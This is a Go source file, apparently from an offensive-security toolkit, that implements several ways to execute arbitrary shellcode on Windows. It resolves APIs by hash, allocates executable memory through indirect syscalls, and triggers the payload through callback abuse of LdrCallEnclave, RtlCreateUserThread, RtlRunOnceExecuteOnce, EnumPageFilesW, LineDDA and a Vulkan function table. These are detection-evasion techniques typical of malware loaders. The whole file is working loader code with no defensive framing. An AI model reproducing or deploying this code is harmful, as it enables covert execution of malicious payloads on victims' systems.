package shellcode

import (
	"fmt"
	"unsafe"

	wc "github.com/carved4/go-wincall"
)

const (
	CURRENT_PROCESS = ^uintptr(0)
)

func memcpy(dst, src uintptr, size uintptr) {
	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), size)
	srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(src)), size)
	copy(dstSlice, srcSlice)
}

func allocateRX(shellcode []byte) (uintptr, error) {
	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	ntProtect := wc.GetSyscall(wc.GetHash("NtProtectVirtualMemory"))
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
		CURRENT_PROCESS,
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		0x00001000|0x00002000,
		0x04,
	)
	if ret != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory failed: 0x%x", ret)
	}
	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(baseAddress)), len(shellcode))
	copy(dstSlice, shellcode)

	var oldProtect uintptr
	protectSize := uintptr(len(shellcode))
	ret, _ = wc.IndirectSyscall(ntProtect.SSN, ntProtect.Address,
		CURRENT_PROCESS,
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&protectSize)),
		0x20,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory failed: 0x%x", ret)
	}
	return baseAddress, nil
}

func EnclaveInject(shellcode []byte) error {
	vdsBase := wc.LoadLibraryLdr("vdsutil.dll")
	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	mscoreeBase := wc.LoadLibraryLdr("mscoree.dll")
	mscoreeHeap := wc.GetFunctionAddress(mscoreeBase, wc.GetHash("GetProcessExecutableHeap"))
	ldrCallEnclave := wc.GetFunctionAddress(ntdllBase, wc.GetHash("LdrCallEnclave"))
	vdsHeapAlloc := wc.GetFunctionAddress(vdsBase, wc.GetHash("VdsHeapAlloc"))
	rwxHeapPtr, _, _ := wc.CallG0(mscoreeHeap)
	allocatedHeap, _, _ := wc.CallG0(vdsHeapAlloc, rwxHeapPtr, 0x00000008, len(shellcode))
	memcpy(allocatedHeap, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var returnParam unsafe.Pointer
	_, _, _ = wc.CallG0(ldrCallEnclave,
		allocatedHeap,
		uintptr(uint32(0)),
		uintptr(unsafe.Pointer(&returnParam)),
	)
	return nil
}

func IndirectSyscallInject(shellcode []byte) error {
	baseAddress, err := allocateRX(shellcode)
	if err != nil {
		return fmt.Errorf("alloc RX failed %v\n", err)
	}
	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	rtlCreateThr := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
	var threadHandle uintptr
	ret, _, _ := wc.CallG0(rtlCreateThr,
		CURRENT_PROCESS,
		0,
		0,
		0,
		0,
		0,
		baseAddress,
		0,
		uintptr(unsafe.Pointer(&threadHandle)),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("RtlCreateUserThread failed: 0x%x", ret)
	}

	if threadHandle != 0 {
		wc.Call("kernel32.dll", "CloseHandle", threadHandle)
	}
	return nil
}

func RunOnce(shellcode []byte) error {
	baseAddress, err := allocateRX(shellcode)
	if err != nil {
		return fmt.Errorf("alloc RX failed %v\n", err)
	}
	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	rtlRunOnceExecuteOnce := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlRunOnceExecuteOnce"))
	var runOnceStruct uintptr
	var context uintptr
	wc.CallG0(
		rtlRunOnceExecuteOnce,
		uintptr(unsafe.Pointer(&runOnceStruct)),
		baseAddress,
		uintptr(unsafe.Pointer(&context)),
	)
	return nil
}

func EnumPageFilesW(shellcode []byte) error {
	baseAddress, err := allocateRX(shellcode)
	if err != nil {
		return fmt.Errorf("alloc RX failed: %v", err)
	}
	kernelbaseBase := wc.LoadLibraryLdr("kernelbase.dll")
	var enumPageFilesFunc uintptr

	if kernelbaseBase != 0 {
		enumPageFilesFunc = wc.GetFunctionAddress(kernelbaseBase, wc.GetHash("EnumPageFilesW"))
	}
	if enumPageFilesFunc == 0 {
		return fmt.Errorf("EnumPageFilesW function not found")
	}
	wc.CallG0(
		enumPageFilesFunc,
		baseAddress,
		0,
	)
	return nil
}

func LineDDA(shellcode []byte) error {
	baseAddress, err := allocateRX(shellcode)
	if err != nil {
		return fmt.Errorf("alloc RX failed: %v", err)
	}
	gdi32Base := wc.LoadLibraryLdr("gdi32.dll")
	lineDDAFunc := wc.GetFunctionAddress(gdi32Base, wc.GetHash("LineDDA"))
	if lineDDAFunc == 0 {
		return fmt.Errorf("LineDDA function not found in gdi32.dll")
	}

	wc.CallG0(lineDDAFunc, 0, 0, 1, 1, baseAddress, 0)

	return nil
}

func Vulkan(shellcode []byte) error {
	baseAddress, err := allocateRX(shellcode)
	if err != nil {
		return fmt.Errorf("alloc RX failed: %v", err)
	}
	const CHECKSUM = 0x10ADED040410ADED

	type EG_STR struct {
		V1    uint64
		Table [256]uint64
	}
	mb := wc.GetModuleBase(wc.GetHash("vulkan-1.dll"))
	if mb == 0 {
		mb = wc.LoadLibraryLdr("vulkan-1.dll")
	}
	fmt.Printf("vulkan-1.dll found at: 0x00%x\n", mb)
	funcaddr := wc.GetFunctionAddress(mb, wc.GetHash("vkCreateSamplerYcbcrConversion"))
	var ex EG_STR
	ex.Table[0] = CHECKSUM
	ex.V1 = uint64(uintptr(unsafe.Pointer(&ex.Table[0])))
	ex.Table[132] = uint64(baseAddress)
	ret, _, err := wc.CallG0(uintptr(funcaddr), uintptr(unsafe.Pointer(&ex)))
	if err != nil {
		fmt.Println(err)
	}
	_ = ret
	return nil
}
